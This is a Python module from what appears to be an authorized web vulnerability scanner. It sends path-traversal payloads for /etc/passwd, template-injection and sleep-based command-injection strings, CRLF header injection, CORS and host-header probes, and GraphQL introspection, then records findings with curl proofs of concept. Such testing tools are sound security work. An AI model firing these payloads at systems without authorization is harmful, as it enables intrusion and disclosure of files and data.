"""deep_probe — additional black-box attack techniques, each with
INCREMENTAL payloads and EARLY-STOP-ON-HIT semantics (user's design):
payloads are ordered; the moment a probe's hit-predicate fires, that
technique/parameter STOPS and the evidence is recorded. Non-destructive:
no file writes, no state changes, no floods. Global request budget caps
the whole run.

Techniques:
- path traversal (params that look file-ish, then all params)
- SSTI ({{7*7}} / ${7*7} / <%= 7*7 %> -> 49)
- command injection, time-based (sleep markers; bounded 2 payloads/param)
- CORS misconfig (Origin reflection with credentials)
- host-header injection (X-Forwarded-Host reflection)
- GraphQL introspection (if a graphql endpoint exists)
- API unauthenticated access matrix (discovered /api/* endpoints)

Active: requires a valid in-scope authorization document."""

from __future__ import annotations

import json
import time
from urllib.parse import urlencode, urlsplit, urlunsplit, parse_qsl

from . import http_engine
from .base import Tool, ToolContext, ToolResult
from ..findings import Finding

MAX_TOTAL = 60  # global request budget for this tool run

TRAVERSAL_PAYLOADS = [
    ("../../../../etc/passwd", "root:", "linux /etc/passwd"),
    ("..\t/..\t/windows/win.ini".replace("\t", "\\"), "[extensions]", "windows win.ini"),
    ("....//....//....//etc/passwd", "root:", "filtered-slash traversal"),
]
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
]
CMDI_PAYLOADS = [
    (";sleep 3;", 2500),
    ("| sleep 3", 2500),
]
CORS_ORIGIN = "https://cx-evil-origin.test"
XFH = "cx-evil-host.test"
GRAPHQL_INTROSPECTION = '{"query":"{ __schema { types { name } } }"}'


def _with_param(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    q = [(k, value if k == param else v) for k, v in parse_qsl(parts.query, keep_blank_values=True)]
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))


def _get(ctx, url, headers=None):
    return http_engine.http_get(url, timeout=ctx.timeout_s, headers=headers)


def _post_json(ctx, url, body: str):
    return http_engine.http_get(url, timeout=ctx.timeout_s, method="POST",
                                data=body.encode(),
                                headers={"Content-Type": "application/json"})


class DeepProbeTool(Tool):
    name = "deep_probe"
    description = ("Black-box attack techniques with incremental payloads and "
                   "early-stop-on-hit: traversal, SSTI, cmdi-time, CORS, "
                   "host-header, GraphQL, API auth matrix.")
    risk_tags = {"active"}
    source_skill = "03"

    def run(self, args: dict, ctx: ToolContext) -> ToolResult:
        base = str(args["url"]).rstrip("/")
        findings: list[Finding] = []
        budget = [MAX_TOTAL]

        def spend(n: int = 1) -> bool:
            if budget[0] <= 0:
                return False
            budget[0] -= n
            return True

        # ---------- 1. CORS misconfig (entrypoint, 1 request, early stop) ----------
        if spend():
            status, headers, body, _ms = _get(ctx, base + "/", {"Origin": CORS_ORIGIN})
            ctx.world.observe_response(base + "/", status, headers, body, self.name)
            acao = headers.get("access-control-allow-origin", "")
            acac = headers.get("access-control-allow-credentials", "").lower()
            if acao == CORS_ORIGIN:
                sev = "medium" if acac in ("true", "1") else "low"
                findings.append(Finding(
                    tool=self.name,
                    title="CORS reflects arbitrary Origin" + (" with credentials" if acac in ("true", "1") else ""),
                    severity=sev, cwe="CWE-942",
                    description=(f"Request with Origin {CORS_ORIGIN} is answered with "
                                 f"Access-Control-Allow-Origin: {acao}"
                                 + (f" and Allow-Credentials: true" if acac in ("true", "1") else "")
                                 + ". Any site can then read responses on behalf of its visitors."),
                    recommendation="Allow-list exact origins; never reflect the Origin header blindly.",
                    target_url=base + "/",
                    request=f"GET {base}/ with Origin: {CORS_ORIGIN}",
                    response=f"ACAO={acao}; ACAC={acac or 'absent'}",
                    poc=f"curl -sI -H 'Origin: {CORS_ORIGIN}' {base}/",
                    confidence=0.9, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response"))

        # ---------- 1b. CRLF injection per parameter (definitive: custom header) ----------
        for ep in ctx.world.param_endpoints(limit=6):
            for param in ep.params[:2]:
                if not spend():
                    break
                u = _with_param(ep.url, param, "cx\r\nX-Cyphron-Probe: 1")
                status, headers, body, _ms = _get(ctx, u)
                ctx.world.observe_response(u, status, headers, body, self.name)
                if "x-cyphron-probe" in {k.lower() for k in headers}:
                    findings.append(Finding(
                        tool=self.name,
                        title=f"CRLF injection via parameter '{param}' (response header injected)",
                        severity="high", cwe="CWE-93",
                        description=(f"CRLF sequence injected into `{param}` produced an attacker-"
                                     f"controlled response header (X-Cyphron-Probe). Enables response "
                                     f"splitting/header manipulation depending on the stack."),
                        recommendation="Strip CR/LF (%0d/%0a) from all user input before use in headers/redirects.",
                        target_url=ep.url, param=param,
                        request=f"GET {u}", response="X-Cyphron-Probe header present in response",
                        confidence=0.95, source_skill=self.source_skill,
                        status="confirmed", evidence_kind="request-response"))
                    break  # EARLY STOP on hit

        # ---------- 1c. Mixed content (definitive marker on HTTPS pages) ----------
        if base.startswith("https://"):
            status, _h, body, _ms = _get(ctx, base + "/")
            insecure = [m for m in ('src="http://', 'href="http://') if m in (body or "")]
            if insecure:
                findings.append(Finding(
                    tool=self.name,
                    title="Mixed content: HTTPS page loads resources over plain HTTP",
                    severity="medium", cwe="CWE-311",
                    description=(f"The HTTPS entrypoint references http:// resources "
                                 f"({', '.join(insecure)}) — traffic for those assets is "
                                 f"unencrypted and tamperable (MITM script injection)."),
                    recommendation="Serve every subresource over HTTPS (or protocol-relative upgrade); add CSP upgrade-insecure-requests.",
                    target_url=base + "/", request=f"GET {base}/ (HTTPS)",
                    response=f"markers found: {insecure}", confidence=0.9,
                    source_skill=self.source_skill, status="confirmed",
                    evidence_kind="request-response"))

        # ---------- 1d. POST form without visible CSRF token (info) ----------
        for url, ep in ctx.world.endpoints.items():
            if ep.method == "POST" and ep.form_fields:
                if not spend():
                    break
                if not any(k in " ".join(ep.form_fields).lower()
                           for k in ("csrf", "_token", "authenticity", "xsrf")):
                    findings.append(Finding(
                        tool=self.name,
                        title=f"POST form without visible CSRF token field: {url}",
                        severity="info", cwe="CWE-352",
                        description=(f"Static HTML of the POST form at {url} carries no CSRF token "
                                     f"field. Modern SPA frameworks often attach the token via "
                                     f"JavaScript/header instead — verify before treating as a "
                                     f"vulnerability."),
                        recommendation="Ensure CSRF protection exists (token or SameSite=Strict cookies + Origin check).",
                        target_url=url, request=f"GET {url} (form inspection)",
                        response=f"fields={ep.form_fields}", confidence=0.4,
                        source_skill=self.source_skill, status="unconfirmed",
                        evidence_kind="code-line"))

        # ---------- 2. Host-header injection (1 request) ----------
        if spend():
            status, headers, body, _ms = _get(ctx, base + "/", {"X-Forwarded-Host": XFH})
            if XFH in (body or ""):
                findings.append(Finding(
                    tool=self.name,
                    title="X-Forwarded-Host reflected into the response (host-header injection surface)",
                    severity="low", cwe="CWE-644",
                    description=(f"The application at {base} renders attacker-controlled "
                                 f"X-Forwarded-Host ('{XFH}') inside the response — classic enabler "
                                 f"for password-reset poisoning and cache-key manipulation when "
                                 f"the host is used to build absolute links."),
                    recommendation="Derive absolute URLs from a fixed configured base, never from forwarded headers.",
                    target_url=base + "/",
                    request=f"GET {base}/ with X-Forwarded-Host: {XFH}",
                    response=f"response contains {XFH!r}",
                    poc=f"curl -s -H 'X-Forwarded-Host: {XFH}' {base}/ | grep -F {XFH}",
                    confidence=0.7, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response"))

        # ---------- 3. GraphQL introspection (1 request if endpoint known) ----------
        gql = next((u for u in ctx.world.endpoints if u.rstrip("/").endswith(("graphql", "graphiql"))), None)
        if gql and spend():
            status, headers, body, _ms = _post_json(ctx, gql, GRAPHQL_INTROSPECTION)
            ctx.world.observe_response(gql, status, headers, body, self.name)
            if status == 200 and "__schema" in (body or ""):
                findings.append(Finding(
                    tool=self.name, title="GraphQL introspection enabled on public endpoint",
                    severity="low", cwe="CWE-200",
                    description=f"POST {gql} returns the full schema (__schema) without authentication — "
                                f"attackers can map the entire API surface.",
                    recommendation="Disable introspection in production; require auth for the IDE endpoints.",
                    target_url=gql, request=f"POST {gql} {GRAPHQL_INTROSPECTION}",
                    response=f"status=200; __schema present", confidence=0.9,
                    source_skill=self.source_skill, status="confirmed",
                    evidence_kind="request-response"))

        # ---------- 4. API unauthenticated access matrix ----------
        api_eps = [u for u in ctx.world.endpoints
                   if "/api/" in u and "auth" not in u][:8]
        for ep in api_eps:
            if not spend():
                break
            status, headers, body, _ms = _get(ctx, ep)
            ctx.world.observe_response(ep, status, headers, body, self.name)
            ctype = headers.get("content-type", "").lower()
            if status == 200 and ("json" in ctype or "xml" in ctype) and len(body or "") > 200:
                findings.append(Finding(
                    tool=self.name,
                    title=f"API endpoint returns data without authentication: {ep}",
                    severity="high", cwe="CWE-306",
                    description=(f"Unauthenticated GET to {ep} returns HTTP 200 with a "
                                 f"{ctype.split(';')[0]} body of {len(body)} bytes. Verify whether "
                                 f"this data is intended to be public."),
                    recommendation="Require authentication/authorization on every non-public API route; default-deny.",
                    target_url=ep, request=f"GET {ep} (no credentials)",
                    response=f"status=200; content-type={ctype.split(';')[0]}; len={len(body)}; "
                             f"excerpt: {body[:200]!r}",
                    poc=f"curl -s '{ep}' | head -c 400",
                    confidence=0.7, source_skill=self.source_skill,
                    status="confirmed", evidence_kind="request-response"))

        # ---------- 5. Parameter techniques: traversal -> SSTI -> cmdi ----------
        baseline_bodies: dict[str, str] = {}
        for ep in ctx.world.param_endpoints(limit=10):
            for param in ep.params[:4]:
                probe_url = ep.url
                if probe_url not in baseline_bodies:
                    if not spend():
                        break
                    _s, _h, _b, _ms = _get(ctx, probe_url)
                    ctx.world.observe_response(probe_url, _s, _h, _b, self.name)
                    baseline_bodies[probe_url] = _b or ""
                baseline_body = baseline_bodies[probe_url]
                # 5a. traversal — 3 payloads; marker must be ABSENT from baseline
                for payload, marker, label in TRAVERSAL_PAYLOADS:
                    if not spend():
                        break
                    u = _with_param(probe_url, param, payload)
                    status, _h, body, _ms = _get(ctx, u)
                    ctx.world.observe_response(u, status, _h, body, self.name)
                    if marker in (body or "") and marker not in baseline_body:
                        findings.append(Finding(
                            tool=self.name,
                            title=f"Path traversal via parameter '{param}' ({label})",
                            severity="critical", cwe="CWE-22",
                            description=(f"Payload {payload!r} on parameter `{param}` returns the "
                                         f"contents of a system file ('{marker}' signature found, "
                                         f"absent from baseline) — arbitrary file read."),
                            recommendation="Resolve files from an allowlist of names/ids; never pass raw paths to the filesystem.",
                            target_url=probe_url, param=param,
                            request=f"GET {u}", response=f"marker {marker!r} found (status {status})",
                            poc=f"curl -g '{u}'   # response contains {marker!r}",
                            confidence=0.95, source_skill=self.source_skill,
                            status="confirmed", evidence_kind="request-response"))
                        break  # EARLY STOP on hit
                if any(f.param == param and "traversal" in f.title for f in findings):
                    continue
                # 5b. SSTI — DUAL-PAYLOAD verification against baseline.
                # A single computed value (e.g. '49' as a PRICE on a pricing page)
                # is a classic false positive; require BOTH math results to appear
                # while the payloads themselves are NOT echoed, and neither value
                # exists in the baseline response.
                stage1_hit = False
                for probe_expr, expected in (("{{7*7}}", "49"), ("{{999*999}}", "998001")):
                    if not spend():
                        break
                    u = _with_param(probe_url, param, probe_expr)
                    status, _h, body, _ms = _get(ctx, u)
                    ctx.world.observe_response(u, status, _h, body, self.name)
                    evaluated = expected in (body or "") and expected not in baseline_body
                    echoed = probe_expr in (body or "")
                    if probe_expr == "{{7*7}}":
                        stage1_hit = evaluated and not echoed
                        if not stage1_hit:
                            break  # nothing suspicious -> early stop (no hit)
                        continue  # stage-1 suspicious -> escalate to stage-2 discriminator
                    if evaluated and not echoed:
                        findings.append(Finding(
                            tool=self.name,
                            title=f"Server-Side Template Injection via parameter '{param}' (dual-payload verified)",
                            severity="critical", cwe="CWE-1336",
                            description=(f"Two independent math payloads on `{param}` are EVALUATED "
                                         f"by a template engine (7*7->49 AND 999*999->998001 appear "
                                         f"in the response, neither in the baseline, payloads not "
                                         f"echoed). Template injection frequently escalates to "
                                         f"remote code execution."),
                            recommendation="Use logic-less templating for user data; never render user input through template engines.",
                            target_url=probe_url, param=param,
                            request=f"GET {_with_param(probe_url, param, '{{999*999}}')}",
                            response="998001 present in payload response, absent in baseline; payload not echoed",
                            poc=f"curl -g '{_with_param(probe_url, param, '{{999*999}}')}'   # contains 998001",
                            confidence=0.95, source_skill=self.source_skill,
                            status="confirmed", evidence_kind="request-response"))
                        break  # EARLY STOP on hit
                    # stage-1 hit but discriminator failed -> coincidence (e.g. a price)
                    ctx.world.note(f"deep_probe: SSTI candidate on '{param}' rejected by "
                                   f"dual-payload discriminator (likely coincidental value)")
                    break
                base_ms = None
                for payload, min_delay in CMDI_PAYLOADS:
                    if not spend():
                        break
                    u = _with_param(probe_url, param, payload)
                    s0, _h0, _b0, base_ms = _get(ctx, probe_url)
                    ctx.world.observe_response(probe_url, s0, _h0, _b0, self.name)
                    status, _h, body, elapsed = _get(ctx, u)
                    ctx.world.observe_response(u, status, _h, body, self.name)
                    if elapsed >= min_delay and base_ms < min_delay:
                        findings.append(Finding(
                            tool=self.name,
                            title=f"Possible command injection via parameter '{param}' (time-based)",
                            severity="critical", cwe="CWE-78",
                            description=(f"Appending '{payload}' to `{param}` delays the response by "
                                         f"~{elapsed - base_ms} ms vs baseline {base_ms} ms — "
                                         f"suggests injected command execution. CONFIRM MANUALLY "
                                         f"before reporting as exploitable."),
                            recommendation="Never pass user input to shell; use language APIs/allowlists.",
                            target_url=probe_url, param=param,
                            request=f"GET {u}", response=f"baseline={base_ms}ms payload={elapsed}ms",
                            confidence=0.6, source_skill=self.source_skill,
                            status="unconfirmed", evidence_kind="probe-pair"))
                        break  # EARLY STOP on hit

        ctx.world.note(f"deep_probe: {MAX_TOTAL - budget[0]} requests spent, "
                       f"{len(findings)} findings, early-stop semantics active")
        return ToolResult(tool=self.name, ok=True,
                          data={"requests_used": MAX_TOTAL - budget[0]},
                          findings=findings)
